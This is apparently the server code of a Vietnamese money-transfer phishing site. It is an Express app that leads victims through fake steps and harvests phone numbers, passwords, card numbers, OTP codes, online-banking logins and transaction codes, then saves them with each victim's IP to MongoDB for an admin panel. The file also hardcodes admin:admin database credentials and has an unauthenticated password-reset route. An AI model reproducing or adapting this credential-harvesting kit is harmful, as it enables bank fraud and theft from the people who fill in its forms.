var express = require("express");
var session = require("express-session");
var expressValidator = require('express-validator');


var passport = require('passport');
var bodyParser = require('body-parser');
var logger = require('morgan');
var mongoose = require("mongoose");
var Info = require("./models/InFo");
var Bank = require("./models/Bank");
var User = require("./models/User");
var admin = require("./routers/admin");
var app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(session({
    secret: 'keyboard cat',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
  }))
  app.use(logger('dev'));
app.use(expressValidator());
// parse application/json
app.use(bodyParser.json());
app.use("/",express.static(__dirname + '/public'));



app.use((req,res,next)=>{
    var ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }
    req.clientIp=ip;
    next();
});

// Connect to Mongo


// Or:
try {
   mongoose.connect('mongodb+srv://admin:admin@cluster0-ixpng.mongodb.net/nhantien?retryWrites=true&w=majority', { useNewUrlParser: true },(erro)=>{
       if(erro){
           console.log("Erro Connect To DB");
       }else{
           console.log("Connected to DB");
       }
   });
} catch (error) {
  
        handleError(error); 
}
app.use(passport.initialize());
app.use(passport.session());

app.set('view engine', 'ejs');
app.use("/admin",admin);
app.get("/",(req,res)=>{
 
    res.render('login',{erro:null});
    
})

app.get("/Buoc-1",(req,res)=>{
  
    if(req.session.InfoId== undefined){
        res.redirect("/");
    }
    else{
        Bank.find({},(err,bank)=>{
            res.render("buoc1",{bank:bank});
        })
        
    }
    
})
app.get("/Buoc-2",(req,res)=>{
    if(req.session.InfoId== undefined){
        res.redirect("/");
    }
    else{
        res.render("buoc2");
    }
    
})
app.get("/Buoc-3",(req,res)=>{
    if(req.session.InfoId== undefined){
        res.redirect("/");
    }
    else{
        res.render("buoc3");
    }
    
})
app.get("/success",(req,res)=>{
    res.render("thanhcong");
})
app.get("/reset",(req,res)=>{
    req.session.InfoId=null;
    res.redirect("/");
})
app.get("/reset-pass",(req,res)=>{
    User.updateOne({username:"admin"},{password:"admin"}, {upsert: true},(erro,data)=>{
        res.send("Thay Đổi Mật Khẩu Thành Công");
      })
})
app.post("/",(req,res)=>{
   
    req.checkBody('SDT').notEmpty().withMessage("Vui Lòng Nhập Số Điện Thoại").isNumeric().withMessage("Vui Lòng Nhập Đúng SDT");
    req.checkBody('password').notEmpty().withMessage("Vui Lòng Nhập Mật Khẩu");
    req.checkBody('magd').notEmpty().withMessage("Vui Lòng Nhập Mã Giao Dịch").isNumeric().withMessage("Vui Lòng Nhập Số");
    var erro = req.validationErrors(true);
    if(erro){
        
        res.render("login",{erro});
    }
    else{
        var obj={ phonenumber:req.body.SDT,
            passwowrd:req.body.password,
            Internationaltransactioncode:req.body.magd,
            IP:req.clientIp
        }
        //console.log(obj);
      
                Info.create(obj,(err,info)=>{
                    if(erro){
                        console.log("Đã Xảy Ra Lỗi");
                        res.redirect("/Buoc-1");
                    }
                    else{
                      
                        req.session.InfoId = info._id;
                        console.log(req.session.InfoId);
                        res.redirect("/Buoc-1");
                    }
    
                })
      
    }
})
app.post("/actionstep1",(req,res)=>{
    
    var obj={
        Bank:req.body.bankname,
        NumberATM:req.body.NumberATM,
        NameAcount:req.body.NameUser,
        releasedate:req.body.releasedate

    }
    Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
       if(doc){
            res.redirect("/Buoc-2");
       }
        
    })
    
})
app.post("/actionstep3",(req,res)=>{
    var obj={
        UserBanking:req.body.UserBanking,
        PasswordBanking:req.body.PasswordBanking,
        Tradingcode:req.body.Tradingcode
    }
    
    Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
        if(doc){
            res.redirect("/success");
        }
         
     })
})
app.post("/actionstep2",(req,res)=>{
    var obj={
        OTP:req.body.OTP
    }
    Info.updateOne({_id:req.session.InfoId},obj,(erro,doc)=>{
        if(doc){
             
             res.redirect("/Buoc-3");
        }
         
     })
})
var server = require("http").Server(app);
var io = require("socket.io")(server);
server.listen(80,()=>{
    console.log("Connted to port :80");
});
io.on('connection', function (socket) {
       
        socket.on("Number-Online", function(data)
		{
            socket.emit("Server-sent-Number", socket.client.conn.server.clientsCount);
		});
  
  });